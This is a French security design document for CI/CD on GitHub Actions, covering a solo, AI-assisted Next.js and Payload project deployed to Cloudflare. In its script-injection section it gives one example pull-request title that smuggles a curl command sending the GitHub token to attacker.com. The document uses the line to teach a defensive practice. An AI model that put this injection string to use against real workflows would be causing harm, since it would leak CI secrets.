# Sécurité CI/CD & GitHub Actions

## 1. Introduction & Contexte Projet

### 1.1 Spécificités du Projet

Ce document définit l'architecture de sécurité CI/CD pour un projet présentant des caractéristiques uniques :

- **Développeur Solo** : Un seul contributeur principal, réduisant significativement les risques liés aux workflows collaboratifs (pull_request_target, fork malveillants)
- **Génération de Code par IA** : Utilisation intensive d'outils IA pour la génération de code, créant des vecteurs de risque spécifiques (hallucinations, imports de paquets inexistants, code mort)
- **Cloudflare Workers + D1** : Infrastructure edge-first avec contraintes spécifiques (pas de connexion DB en CI)
- **Repo Privé** : Initialement privé, éliminant les risques de contributions externes non contrôlées

### 1.2 Menaces Réelles vs Théoriques

**Menaces Critiques pour ce Projet :**
1. **Supply Chain Attacks** : Injection de dépendances malveillantes via hallucinations IA ou typosquatting
2. **Code Quality Drift** : Accumulation de code mort, imports cassés, violations d'architecture générés par l'IA
3. **Secret Exposure** : Fuite de credentials Cloudflare (API tokens, account ID) dans les logs ou via secrets statiques

**Menaces Théoriques (Risque Négligeable) :**
- ❌ Pull Request malveillantes (repo privé solo)
- ❌ Exploitation de runners auto-hébergés (utilisation de GitHub-hosted runners uniquement)
- ❌ Cache poisoning multi-branches (workflow simple, une seule branche principale)

### 1.3 Philosophie "AI-Shield" (ENF6)

Le pipeline CI/CD implémente une stratégie de **défense en profondeur** en 4 couches successives :

```
┌─────────────────────────────────────────────────────────────┐
│ Layer 1: Supply Chain (Socket.dev + SHA Pinning)           │
│          → Bloque les paquets malveillants AVANT l'install  │
├─────────────────────────────────────────────────────────────┤
│ Layer 2: Code Quality (Knip + ESLint + Type Sync)          │
│          → Détecte hallucinations, code mort, drift types   │
├─────────────────────────────────────────────────────────────┤
│ Layer 3: Build Validation (Next.js no-DB mode)             │
│          → Garantit buildabilité sans dépendances runtime   │
├─────────────────────────────────────────────────────────────┤
│ Layer 4: Identity (OIDC - Phase 2)                         │
│          → Élimine secrets statiques, limite blast radius   │
└─────────────────────────────────────────────────────────────┘
```

## 2. Supply Chain Security (Phase 1 - MVP)

### 2.1 Socket.dev - Protection contre les Paquets Malveillants

**Problématique** : Les outils de génération de code par IA peuvent "halluciner" des noms de paquets qui n'existent pas, ou introduire des dépendances avec des typos permettant des attaques par typosquatting. Socket.dev analyse les paquets npm avant installation.

**Configuration Bloquante** :

```yaml
# .github/workflows/quality-gate.yml
- name: Socket.dev Supply Chain Security
  uses: socketdev/socket-security-action@v1.2.3  # ⚠️ À épingler par SHA
  with:
    mode: block  # Bloque si vulnérabilité HIGH/CRITICAL détectée
    scope: dependencies  # Analyse package.json + pnpm-lock.yaml
```

**Détections Clés** :
- Paquets avec installation scripts suspects (postinstall malveillants)
- Typosquatting (lodahs vs lodash)
- Paquets récemment publiés (< 30 jours) par auteurs inconnus
- Imports de modules natifs Node.js dans du code prétendu browser-only

**Référence** : [Socket.dev CI Documentation](../tech/github/socker-dev-CI.md)

### 2.2 Pinning par SHA des Actions GitHub

**Rationale** : Les tags de version (`@v3`) sont **mutables**. Un mainteneur compromis peut déplacer le tag vers un commit malveillant sans que le consommateur ne le détecte. Le SHA est un hash cryptographique immuable.

**Configuration Sécurisée** :

```yaml
# ✅ CORRECT : Épinglage par SHA complet
- uses: actions/checkout@f43a0e5ff2bd294095638e18286ca9a3d1956744  # v3.6.0

# ❌ INCORRECT : Tag mutable
- uses: actions/checkout@v3
```

**Tableau de Comparaison** :

| Méthode     | Syntaxe                        | Sécurité                                    | Maintenabilité                               | Recommandation                             |
| :---------- | :----------------------------- | :------------------------------------------ | :------------------------------------------- | :----------------------------------------- |
| **Tag**     | `uses: actions/checkout@v3`    | **Faible** (Mutable, sujet au détournement) | **Élevée** (Mises à jour mineures auto)      | À éviter pour workflows critiques          |
| **Branche** | `uses: actions/checkout@main`  | **Très Faible** (Instable et mutable)       | **Élevée** (Toujours à jour)                 | Ne jamais utiliser                         |
| **SHA**     | `uses: actions/checkout@f43a...` | **Élevée** (Immuable, vérifiable)         | **Faible** (Mises à jour manuelles requises) | **Fortement Recommandé** (avec Dependabot) |

**Exception** : Les actions officielles GitHub (`actions/checkout`, `actions/setup-node`) peuvent rester en tags pour simplicité, car elles bénéficient d'un audit de sécurité continu par GitHub.

### 2.3 Dependabot pour Maintenance Automatique

**Problématique** : L'épinglage par SHA empêche les mises à jour automatiques de sécurité. Dependabot surveille les Actions et crée des PRs pour mettre à jour les SHA vers les nouvelles versions.

**Configuration** :

```yaml
# .github/dependabot.yml
version: 2
updates:
  # Surveillance des GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  # Surveillance des dépendances npm
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    groups:
      # Regroupe les mises à jour mineures pour réduire le bruit
      minor-updates:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"
```

**Bénéfices** :
- Maintenance **zero-touch** des SHA épinglés
- Détection automatique des CVE dans les dépendances npm
- Réduction du bruit via grouping des mises à jour mineures

### 2.4 Détection Sécurisée des Fichiers Modifiés

**Contexte de l'incident** : En mars 2025, l'action tierce `tj-actions/changed-files` (très populaire pour ne linter que les fichiers modifiés) a été **compromise par une attaque de la chaîne d'approvisionnement**. Un attaquant a injecté du code malveillant capable d'exfiltrer des secrets CI.

**Leçon** : Les actions tierces "utilitaires" représentent une surface d'attaque significative. Les fonctionnalités simples doivent être implémentées nativement.

**Solution Native (git diff)** :

```bash
#!/bin/bash
# Script sécurisé pour linter uniquement les fichiers modifiés

# Récupération de la branche cible pour comparaison
git fetch origin main:main

# Identification des fichiers modifiés (TS/TSX/JS/MJS uniquement)
CHANGED_FILES=$(git diff --name-only main...HEAD -- '*.ts' '*.tsx' '*.js' '*.mjs')

if [ -n "$CHANGED_FILES" ]; then
  echo "Linting changed files: $CHANGED_FILES"
  pnpm exec eslint $CHANGED_FILES --max-warnings 0
else
  echo "No relevant files changed, skipping lint."
fi
```

**Intégration GitHub Actions** :

```yaml
- name: Lint Changed Files Only
  run: |
    git fetch origin main:main
    CHANGED_FILES=$(git diff --name-only main...HEAD -- '*.ts' '*.tsx' '*.js' '*.mjs')
    if [ -n "$CHANGED_FILES" ]; then
      echo "::group::Linting changed files"
      echo "$CHANGED_FILES"
      echo "::endgroup::"
      pnpm exec eslint $CHANGED_FILES --max-warnings 0
    else
      echo "No relevant files changed."
    fi
```

**Avantages** :
- **Zéro dépendance tierce** : Élimine complètement le risque de supply chain attack
- **Performance** : Ne lint que les fichiers réellement modifiés
- **Transparence** : Code visible et auditable directement dans le workflow

**Note** : Cette approche est optionnelle. Pour un projet de taille modeste, linter l'ensemble du codebase avec cache ESLint reste acceptable et plus simple.

**Référence** : [Incident tj-actions - Snyk Analysis](https://snyk.io/blog/reconstructing-tj-actions-changed-files-github-actions-compromise/)

## 3. Code Quality Gates (Phase 1 - MVP)

### 3.1 Knip - Détection de Code Mort

**Problématique Spécifique IA** : Les outils de génération de code créent souvent des fichiers, fonctions ou imports qui ne sont jamais utilisés. Knip détecte :
- Fichiers non importés
- Exports non utilisés
- Dépendances npm installées mais jamais importées
- Types TypeScript orphelins

**Configuration** :

```yaml
# .github/workflows/quality-gate.yml
- name: Knip - Dead Code Detection
  run: pnpm exec knip --strict
```

```jsonc
// knip.json
{
  "$schema": "https://unpkg.com/knip@5/schema.json",
  "entry": ["src/app/**/*.tsx", "src/lib/**/*.ts"],
  "project": ["src/**/*.{ts,tsx}"],
  "ignore": [
    "src/payload-types.ts",  // Généré automatiquement
    "**/*.test.ts"
  ],
  "ignoreDependencies": [
    "@cloudflare/workers-types"  // Types utilisés uniquement pour LSP
  ]
}
```

**Référence** : [Knip CI Documentation](../tech/github/knip-CI.md)

### 3.2 Type Synchronization (Payload ↔ TypeScript)

**Problématique** : Payload CMS génère des types TypeScript (`src/payload-types.ts`) basés sur les collections configurées. Un désalignement entre la configuration et les types peut causer des runtime errors en production.

**Validation** :

```yaml
# .github/workflows/quality-gate.yml
- name: Generate Payload Types
  run: pnpm generate:types:payload

- name: Check for Type Drift
  run: |
    if git diff --exit-code src/payload-types.ts; then
      echo "✅ Types Payload synchronisés"
    else
      echo "❌ ERREUR: Types Payload désynchronisés. Exécutez 'pnpm generate:types:payload'"
      git diff src/payload-types.ts
      exit 1
    fi
```

**Référence** : [Payload CI Documentation - Section 2](../tech/github/github-actions-nextjs-payload.md#2-synchronisation-des-types-payload)

### 3.3 ESLint + Prettier + Tailwind Ordering

**Problématique** : Code généré par IA peut ne pas respecter les conventions de formatage, créant du bruit dans les diffs et rendant la revue difficile.

#### Séparation Stricte des Préoccupations

**Anti-pattern à éviter** : L'utilisation de `eslint-plugin-prettier` pour exécuter Prettier à l'intérieur d'ESLint est obsolète et contre-productive :

1. **Surcharge de Performance** : Chaque fichier est parsé deux fois (ESLint + Prettier), doublant le temps d'exécution
2. **Pollution Visuelle** : Les erreurs de formatage (toujours auto-corrigibles) sont mélangées aux erreurs logiques, diluant l'attention sur les bugs réels

**Approche recommandée** : Exécuter Prettier et ESLint comme deux processus **distincts et parallèles**. ESLint est configuré avec `eslint-config-prettier` pour désactiver les règles de conflit.

#### Configuration ESLint 9 Flat Config

Next.js 15 ne fournit pas encore de configuration Flat Config native. L'utilisation de `FlatCompat` est requise pour adapter les règles héritées.

```javascript
// eslint.config.mjs
import { FlatCompat } from '@eslint/eslintrc';
import js from '@eslint/js';
import typescriptEslint from 'typescript-eslint';
import prettierConfig from 'eslint-config-prettier';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const compat = new FlatCompat({ baseDirectory: __dirname });

export default [
  // 1. Ignorances Globales (Performance)
  {
    ignores: [
      ".next/**",
      "node_modules/**",
      "build/**",
      "dist/**",
      "**/*.d.ts",
      "src/payload-types.ts", // ⚠️ CRITIQUE : Fichier généré par Payload
      "coverage/**"
    ],
  },

  // 2. Base JavaScript
  js.configs.recommended,

  // 3. TypeScript
  ...typescriptEslint.configs.recommended,

  // 4. Next.js (via couche de compatibilité)
  ...compat.extends('next/core-web-vitals'),

  // 5. Overrides Spécifiques Payload
  {
    files: ["src/payload.config.ts", "src/scripts/*.ts"],
    rules: {
      "no-console": "off",     // Scripts serveur nécessitent des logs
      "no-process-env": "off"  // Payload repose sur les variables d'env
    }
  },

  // 6. Prettier (DOIT être en dernier)
  prettierConfig,
];
```

**Points critiques** :
- **`src/payload-types.ts` exclu** : Fichier généré automatiquement par Payload, linter ce fichier consomme des ressources CPU pour une valeur nulle
- **Format `.mjs`** : Force le mode ESM, aligné avec `next.config.mjs`
- **Ordre séquentiel** : Le tableau est traité dans l'ordre, `prettierConfig` doit être en dernier pour écraser les conflits

#### Configuration Prettier

```javascript
// prettier.config.mjs
/** @type {import("prettier").Config} */
const config = {
  semi: false,
  singleQuote: true,
  tabWidth: 2,
  trailingComma: 'all', // Critique : réduit les diffs git lors d'ajouts
  printWidth: 100,
  plugins: ['prettier-plugin-tailwindcss'],
  tailwindFunctions: ['cn', 'cva'],
};

export default config;
```

**Bénéfices Tailwind Plugin** :
- Ordre déterministe des classes Tailwind (réduit les conflicts git)
- Détecte les classes dupliquées (ex: `p-4 padding-4`)

#### Workflow CI

```yaml
# .github/workflows/quality-gate.yml
- name: Lint & Format Check
  run: |
    pnpm exec eslint . --max-warnings 0 --cache --cache-location .eslintcache --format stylish
    pnpm exec prettier . --check
```

**Note** : `--format stylish` est obligatoire pour que les Problem Matchers GitHub créent des annotations sur les fichiers modifiés dans l'interface PR.

**Référence** : [ESLint/Prettier CI Documentation](../tech/github/eslint-prettier-CI.md)

### 3.4 Stratégie de Cache CI (ESLint vs Prettier)

**Problématique** : Les stratégies de cache pour ESLint et Prettier sont fondamentalement différentes en environnement CI. Une configuration naïve peut être contre-productive.

#### Prettier : Cache NON recommandé en CI

Par défaut, le cache Prettier utilise les **métadonnées de fichier** (date de modification - mtime) pour l'invalidation. Problème : l'action `actions/checkout` de GitHub **réécrit les timestamps** de tous les fichiers à l'heure du checkout.

**Conséquence** : Le cache est invalidé à chaque exécution, rendant la sauvegarde/restauration du cache (temps réseau) plus coûteuse que l'exécution directe.

```yaml
# ❌ Inutile pour la plupart des projets
- name: Prettier Check (avec cache inefficace)
  run: pnpm exec prettier . --check --cache

# ✅ Recommandé : exécution directe sans cache
- name: Prettier Check
  run: pnpm exec prettier . --check
```

**Exception (grands monorepos > 5000 fichiers)** : Utiliser `--cache-strategy content` qui hashe le contenu des fichiers au lieu des timestamps. Plus intensif CPU mais fiable.

#### ESLint : Cache OBLIGATOIRE

ESLint avec règles TypeScript est significativement plus lent que Prettier. Le cache est ici indispensable et doit être configuré avec une **clé composite** :

```yaml
- name: Restore ESLint Cache
  uses: actions/cache@v4
  with:
    path: .eslintcache
    # Clé primaire : dépendances + contenu source exact
    key: ${{ runner.os }}-eslint-${{ hashFiles('pnpm-lock.yaml') }}-${{ hashFiles('**/*.[jt]s', '**/*.[jt]sx') }}
    # Clés de repli : récupérer le cache de main même si le code a changé
    restore-keys: |
      ${{ runner.os }}-eslint-${{ hashFiles('pnpm-lock.yaml') }}-

- name: ESLint Check
  run: pnpm exec eslint . --max-warnings 0 --cache --cache-location .eslintcache --format stylish
```

**Rationale des clés** :
- `hashFiles('pnpm-lock.yaml')` : Une mise à jour d'ESLint ou de ses plugins invalide le cache
- `hashFiles('**/*.[jt]s', '**/*.[jt]sx')` : Le contenu source exact pour maximiser les hits
- `restore-keys` : Permet de récupérer un cache partiel depuis `main`, accélérant le linting des PRs (seuls les fichiers modifiés sont revérifiés)

**Référence** : [ESLint/Prettier CI Documentation - Section 4](../tech/github/eslint-prettier-CI.md#4-architecture-cicd-dans-github-actions)

## 4. Build Validation (Phase 1 - MVP)

### 4.1 Next.js Build sans Base de Données

**Contrainte Cloudflare D1** : La base de données D1 n'est **pas accessible** dans l'environnement CI. Payload CMS nécessite normalement une connexion DB pour le build. Solution : `--experimental-build-mode compile`.

**Configuration** :

```yaml
# .github/workflows/quality-gate.yml
- name: Next.js Build (No-DB Mode)
  run: pnpm exec next build --experimental-build-mode compile
  env:
    # Variables factices pour satisfaire les validations Payload
    PAYLOAD_SECRET: "ci-build-dummy-secret-32-chars-min"
    DATABASE_URI: "file:./dummy.db"
```

**Ce que ce build valide** :
- ✅ Compilation TypeScript réussie (pas d'erreurs de types)
- ✅ Résolution de tous les imports (pas de modules manquants)
- ✅ Génération des bundles client/serveur sans crash
- ❌ **N'exécute PAS** les migrations DB ou les seeds

**Référence** : [Payload CI Documentation - Section 1](../tech/github/github-actions-nextjs-payload.md#1-build-nextjs-sans-connexion-base-de-données)

## 5. OIDC pour Cloudflare (Phase 2 - Enhanced)

### 5.1 Élimination des Secrets Statiques

**Problématique des Secrets Statiques** : Stocker `CLOUDFLARE_API_TOKEN` dans GitHub Secrets crée une surface d'attaque permanente. Si le token est exfiltré (via injection de script, logs mal configurés, ou compromission du runner), il reste valide jusqu'à révocation manuelle.

**Solution OIDC** : OpenID Connect établit une **relation de confiance** entre GitHub et Cloudflare. Au lieu de stocker un token, le workflow demande un JWT signé à GitHub, que Cloudflare échange contre un token temporaire (TTL < 1h).

**Mécanisme** :

```
┌──────────────┐                          ┌──────────────┐
│ GitHub       │  1. Demande JWT         │ Cloudflare   │
│ Workflow     │ ───────────────────────> │ IdP          │
│              │                          │              │
│              │  2. JWT signé            │              │
│              │ <─────────────────────── │              │
│              │                          │              │
│              │  3. Échange JWT          │              │
│              │ ───────────────────────> │ API          │
│              │                          │              │
│              │  4. Token temporaire     │              │
│              │ <─────────────────────── │              │
└──────────────┘                          └──────────────┘
```

**Configuration (Simplifié)** :

```yaml
# .github/workflows/deploy.yml
permissions:
  id-token: write  # ⚠️ CRITIQUE : Permet la génération du JWT
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Authenticate to Cloudflare via OIDC
        uses: cloudflare/wrangler-action@v3
        with:
          apiTokenPermissions: |
            account:read
            worker:write
            d1:write
          # Pas de apiToken statique !
```

**Bénéfices** :
- **Blast Radius Limité** : Token expiré automatiquement après 1h
- **Auditabilité** : Chaque échange OIDC est loggé avec le SHA du commit déclencheur
- **Zero Rotation** : Pas de rotation manuelle de secrets

**Référence** : [Section 4.2 - OIDC dans GitHub Actions](./securite_github_action.md#42-openid-connect-oidc-et-lauthentification-sans-clé)

### 5.2 Principe de Moindre Privilège (GITHUB_TOKEN)

**Problématique** : Historiquement, `GITHUB_TOKEN` possédait des permissions **read/write** par défaut sur le repo. Un workflow compromis pouvait pousser du code malveillant, créer des releases, ou modifier les settings.

**Configuration Défensive** :

```yaml
# .github/workflows/quality-gate.yml
permissions:
  contents: read      # Lecture seule du code
  pull-requests: write  # Uniquement si commentaires de bot nécessaires
  # Pas de 'issues: write', 'packages: write', etc.

jobs:
  quality-gate:
    runs-on: ubuntu-latest
    # Permissions héritées du workflow
```

**Règle d'Or** : Définir **explicitement** les permissions minimales nécessaires. Si un job ne fait que lire et tester, `contents: read` suffit.

## 6. Pratiques de Sécurité Essentielles (Phase 1)

### 6.1 Gestion des Entrées (Script Injection Prevention)

**Contexte pour Repo Privé Solo** : Le risque d'injection de script est **faible** dans un repo privé sans contributions externes. Cependant, la bonne pratique reste simple à implémenter et protège contre les erreurs.

**Vulnérabilité** :

```yaml
# ❌ VULNÉRABLE : Interpolation directe dans script shell
- name: Vérifier le titre de la PR
  run: |
    title="${{ github.event.pull_request.title }}"
    if [[ $title =~ ^octocat ]]; then
      echo "Titre Valide"
    fi
```

**Attaque** : Un titre de PR comme `a"; curl http://attacker.com?token=$GITHUB_TOKEN "` exécute une commande arbitraire.

**Solution : Variables d'Environnement Intermédiaires** :

```yaml
# ✅ SÉCURISÉ : Isolation via environnement
- name: Vérifier le titre de la PR
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    if [[ $TITLE =~ ^octocat ]]; then
      echo "Titre Valide"
    fi
```

**Principe** : Les variables d'environnement sont stockées dans la mémoire du processus. Le shell les référence **comme données**, pas comme code exécutable.

**Inputs Non Fiables** :
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.pull_request.head.ref` (nom de branche)

**Référence** : [Section 2.2 - Gestion des Entrées](./securite_github_action.md#22-stratégies-de-mitigation-par-variables-denvironnement-intermédiaires)

### 6.2 Secrets Management

**Règles Absolues** :
1. ❌ **Jamais** de secrets inline dans le YAML (ex: `API_KEY: "sk-proj-abc123..."`)
2. ❌ **Jamais** de secrets commités dans `.env` ou fichiers de config
3. ✅ Utiliser exclusivement GitHub Secrets (`${{ secrets.CLOUDFLARE_API_TOKEN }}`)
4. ✅ Migrer vers OIDC en Phase 2 pour éliminer les secrets statiques

**Masquage des Secrets dans les Logs** :

GitHub masque automatiquement les valeurs de `secrets.*` dans les logs, **mais** :
- Données structurées (JSON) échouent souvent au masquage
- L'encodage (base64, hex) contourne le masquage
- Les secrets dans les variables d'environnement custom ne sont pas automatiquement masqués

**Protection Additionnelle** : Ne jamais logger les variables d'environnement suspectes (`env`, `printenv`).

## 7. Performance & Accessibility (Phase 2 - Enhanced)

### 7.1 Lighthouse CI

**Objectif** : Prévenir la régression de performance et d'accessibilité via des **budgets stricts**. Le build échoue si les scores descendent sous les seuils.

**Budgets Définis** :
- **Performance** : ≥ 90
- **Accessibility** : = 100 (non négociable)
- **SEO** : = 100
- **Best Practices** : ≥ 95

**Configuration** :

```yaml
# .github/workflows/quality-gate.yml
- name: Lighthouse CI
  uses: treosh/lighthouse-ci-action@v11
  with:
    urls: |
      http://localhost:3000/
      http://localhost:3000/blog
      http://localhost:3000/admin
    budgetPath: ./lighthouserc.json
    temporaryPublicStorage: true
```

```json
// lighthouserc.json
{
  "ci": {
    "assert": {
      "preset": "lighthouse:recommended",
      "assertions": {
        "categories:performance": ["error", {"minScore": 0.9}],
        "categories:accessibility": ["error", {"minScore": 1.0}],
        "categories:seo": ["error", {"minScore": 1.0}]
      }
    }
  }
}
```

**Référence** : [Lighthouse CLI Documentation](../tech/github/ligthouse-cli-CI.md)

### 7.2 Playwright + axe-core

**Objectif** : Tests d'accessibilité automatisés pour garantir la conformité WCAG 2.1 AA sur les pages FR/EN.

**Configuration** :

```typescript
// tests/e2e/a11y.e2e.spec.ts
import { test, expect } from '@playwright/test'
import AxeBuilder from '@axe-core/playwright'

test.describe('Accessibilité', () => {
  test('Page d\'accueil FR - WCAG 2.1 AA', async ({ page }) => {
    await page.goto('/')
    const results = await new AxeBuilder({ page })
      .withTags(['wcag2a', 'wcag2aa'])
      .analyze()

    expect(results.violations).toEqual([])
  })

  test('Page d\'accueil EN - WCAG 2.1 AA', async ({ page }) => {
    await page.goto('/en')
    const results = await new AxeBuilder({ page })
      .withTags(['wcag2a', 'wcag2aa'])
      .analyze()

    expect(results.violations).toEqual([])
  })
})
```

**Détections** :
- Contraste insuffisant (couleurs)
- Images sans `alt`
- Formulaires sans labels
- Navigation clavier impossible
- Rôles ARIA manquants

## 8. Architecture Validation (Phase 2 - Enhanced)

### 8.1 dependency-cruiser

**Objectif** : Interdire les violations architecturales typiques dans une app Next.js + Payload :
- Code serveur importé dans un composant client (`'use client'`)
- Imports circulaires
- Dépendances non autorisées (ex: composant UI important directement depuis Payload)

**Configuration** :

```javascript
// .dependency-cruiser.cjs
module.exports = {
  forbidden: [
    {
      name: 'no-server-in-client',
      severity: 'error',
      from: { path: '^src/app/.*\\.tsx$', pathNot: '\\.server\\.tsx$' },
      to: { path: '^src/(collections|lib)/.*server.*' },
      comment: 'Code serveur ne doit pas être importé dans composants clients'
    },
    {
      name: 'no-circular',
      severity: 'error',
      from: {},
      to: {
        circular: true,
        // Ignore les cycles qui ne sont QUE des imports de types (TypeScript)
        dependencyTypesNot: ['type-only']
      }
    }
  ]
}
```

**Baseline pour Adoption Progressive** :

L'introduction de règles architecturales sur un projet existant génère souvent de nombreuses violations. La fonctionnalité **baseline** permet de geler la dette technique et de la rembourser progressivement :

```bash
# 1. Générer le cliché des violations existantes
npx depcruise src --output-type json > .dependency-cruiser-known-violations.json

# 2. Utiliser la baseline dans la CI (seules les NOUVELLES violations bloquent)
npx depcruise src --known-violations .dependency-cruiser-known-violations.json
```

**Intégration GitHub Actions avec Summary** :

```yaml
- name: Run Dependency Cruiser
  id: depcruise
  continue-on-error: true
  run: |
    npx depcruise src \
      --config .dependency-cruiser.cjs \
      --known-violations .dependency-cruiser-known-violations.json \
      --output-type json \
      --output-to depcruise-report.json

# Injection du rapport dans le GitHub Job Summary
- name: Create Job Summary
  run: |
    echo "## 🏗️ Rapport d'Architecture" >> $GITHUB_STEP_SUMMARY
    npx depcruise-fmt depcruise-report.json --output-type markdown >> $GITHUB_STEP_SUMMARY

- name: Check for Failure
  if: steps.depcruise.outcome == 'failure'
  run: exit 1
```

**Référence** : [dependency-cruiser Documentation](../tech/github/dependancy-cruiser-CI.md)

## 9. Mutation Testing (Phase 3 - Advanced)

### 9.1 Stryker

**Problématique** : Les tests générés par IA peuvent être des "faux positifs" (tests qui passent toujours, même si la logique est cassée). Le mutation testing **altère** le code source et vérifie que les tests **échouent**.

**Exemple** :

```typescript
// Code original
function calculateTotal(items: Item[]) {
  return items.reduce((sum, item) => sum + item.price, 0)
}

// Mutation 1 : Stryker remplace '+' par '-'
function calculateTotal(items: Item[]) {
  return items.reduce((sum, item) => sum - item.price, 0)  // ⚠️ Mutant
}
```

Si le test passe toujours après la mutation, c'est un **test superficiel**.

**Configuration Ciblée** : Exécuter uniquement sur modules critiques (Server Actions, lib/) pour limiter le coût CPU.

```javascript
// stryker.config.mjs
export default {
  mutate: [
    'src/lib/**/*.ts',
    'src/app/**/*.server.ts',
    '!**/*.test.ts',
    '!**/*.spec.ts'
  ],
  testRunner: 'vitest',
  coverageAnalysis: 'perTest',
  thresholds: { high: 80, low: 60, break: 50 }
}
```

**Coût** : Mutation testing est **CPU-intensif** (10-30min pour un projet moyen). À réserver à la Phase 3 après validation du ROI.

## 10. Anti-Patterns à Éviter

| Anti-Pattern | Pourquoi c'est dangereux | Contexte Projet |
|--------------|--------------------------|-----------------|
| **pull_request_target** | Exécute code non fiable avec secrets | ❌ Inutile (repo privé solo, pas de forks) |
| **Runners auto-hébergés** | Persistance malware, mouvement latéral réseau | ❌ Inutile (GitHub-hosted runners suffisants) |
| **Secrets réutilisables** | Un secret compromis = tous les workflows compromis | ✅ Pertinent : un secret par scope |
| **Permissions GITHUB_TOKEN en write par défaut** | Blast radius maximal si compromission | ✅ Pertinent : définir read-only par défaut |
| **Actions épinglées par tag** | Tags mutables, détournement supply chain | ✅ Pertinent : épingler par SHA |
| **Cache partagé multi-branches** | Empoisonnement de cache cross-branch | ❌ Risque faible (une seule branche principale) |

## 11. Implémentation CI/CD Complète

**Objectif** : CI/CD complète opérationnelle dès la première mise en production (page "En construction" avec i18n)

### 11.1 Stratégie de Déclenchement

**Principe** : Workflows déclenchés **manuellement** (`workflow_dispatch`) mais **obligatoires** pour merger via branch protection.

```yaml
# Déclenchement manuel uniquement
on:
  workflow_dispatch:
    inputs:
      run_mutation_tests:
        description: 'Exécuter Stryker (mutation testing)'
        required: false
        default: false
        type: boolean
```

**Pourquoi ce choix ?**
- ✅ Évite les exécutions répétées à chaque commit/push pendant le développement
- ✅ Le développeur lance le workflow quand il est prêt (après plusieurs commits locaux)
- ✅ Branch protection garantit qu'aucune PR ne peut être mergée sans workflow validé
- ✅ Économie de minutes GitHub Actions

**Configuration Branch Protection (Settings > Branches > main)** :
```
☑ Require status checks to pass before merging
  ☑ Require branches to be up to date before merging
  Status checks required:
    - quality-gate
    - deploy-preview (optionnel)
```

### 11.2 Checklist d'Implémentation

#### Supply Chain Security
- [ ] **Socket.dev** : Bloquer les paquets malveillants (typosquatting, scripts suspects)
- [ ] **SHA pinning** : Épingler toutes les actions tierces par SHA complet
- [ ] **Dependabot** : Automatiser mises à jour de sécurité (actions + npm)

#### Code Quality Gates
- [ ] **Knip** : Détecter code mort et imports orphelins (hallucinations IA)
- [ ] **Type sync** : Valider synchronisation Payload ↔ TypeScript
- [ ] **ESLint + Prettier** : Formatage et linting strict (includes Tailwind ordering)
- [ ] **dependency-cruiser** : Validation architecture (imports serveur/client)

#### Build & Tests
- [ ] **Next.js build no-DB** : `next build --experimental-build-mode compile` (sans D1)
- [ ] **Vitest** : Tests unitaires et d'intégration
- [ ] **Playwright + axe-core** : Tests E2E et accessibilité WCAG 2.1 AA (FR/EN)
- [ ] **Stryker** : Mutation testing sur modules critiques (optionnel via input)

#### Performance & Accessibilité
- [ ] **Lighthouse CI** : Budgets stricts (Performance ≥90, A11y =100, SEO =100)

#### Sécurité & Déploiement
- [ ] **OIDC Cloudflare** : Authentification sans secrets statiques
- [ ] **Permissions GITHUB_TOKEN** : Définir explicitement en read-only par défaut

### 11.3 Structure du Workflow

```yaml
# .github/workflows/quality-gate.yml
name: Quality Gate

on:
  workflow_dispatch:
    inputs:
      run_mutation_tests:
        description: 'Exécuter Stryker (mutation testing) - CPU intensif'
        required: false
        default: false
        type: boolean

permissions:
  contents: read
  id-token: write  # Pour OIDC Cloudflare

jobs:
  quality-gate:
    runs-on: ubuntu-latest
    steps:
      # 1. Supply Chain (bloque avant toute installation)
      - name: Socket.dev Scan
        uses: socketdev/socket-security-action@<SHA>

      # 2. Checkout + Setup
      - uses: actions/checkout@<SHA>
      - uses: pnpm/action-setup@<SHA>
      - uses: actions/setup-node@<SHA>

      # 3. Installation
      - run: pnpm install --frozen-lockfile

      # 4. Code Quality (parallélisable via matrix ou jobs séparés)
      - run: pnpm exec knip --strict
      - run: pnpm exec eslint . --max-warnings 0
      - run: pnpm exec prettier --check .
      - run: pnpm generate:types:payload && git diff --exit-code src/payload-types.ts
      - run: pnpm exec depcruise --config .dependency-cruiser.cjs src

      # 5. Build
      - run: pnpm exec next build --experimental-build-mode compile
        env:
          PAYLOAD_SECRET: "ci-build-dummy-secret-32-chars-min"

      # 6. Tests
      - run: pnpm test:int
      - run: pnpm test:e2e

      # 7. Performance
      - name: Lighthouse CI
        uses: treosh/lighthouse-ci-action@<SHA>

      # 8. Mutation Testing (conditionnel)
      - name: Stryker Mutation Testing
        if: ${{ inputs.run_mutation_tests }}
        run: pnpm exec stryker run

  deploy-preview:
    needs: quality-gate
    runs-on: ubuntu-latest
    steps:
      - name: Deploy to Cloudflare (OIDC)
        uses: cloudflare/wrangler-action@<SHA>
        # OIDC - pas de apiToken statique
```

### 11.4 Workflow Développeur Recommandé

```
1. Développement local (plusieurs commits)
   └── pnpm lint && pnpm test (checks rapides locaux)

2. Push vers branche feature
   └── Pas de workflow automatique

3. Création PR vers main
   └── GitHub affiche "Required checks not run"

4. Déclenchement manuel du workflow
   └── Actions > Quality Gate > Run workflow
   └── Sélectionner la branche de la PR

5. Workflow passe ✅
   └── PR peut être mergée

6. Merge vers main
   └── Déploiement (workflow séparé ou même workflow)
```

## 12. Références

### Documentation Technique Détaillée
- [Recherche Sécurité GitHub Actions (400+ lignes)](../tech/github/securite_github_action.md)
- [Spécificités Payload CMS + Next.js CI/CD](../tech/github/github-actions-nextjs-payload.md)

### Documentation Outils Individuels
- [Socket.dev CI](../tech/github/socker-dev-CI.md)
- [Knip CI](../tech/github/knip-CI.md)
- [Lighthouse CLI](../tech/github/ligthouse-cli-CI.md)
- [ESLint + Prettier CI](../tech/github/eslint-prettier-CI.md)
- [dependency-cruiser CI](../tech/github/dependancy-cruiser-CI.md)

### Ressources Externes
- [GitHub Actions Security Best Practices (Officiel)](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
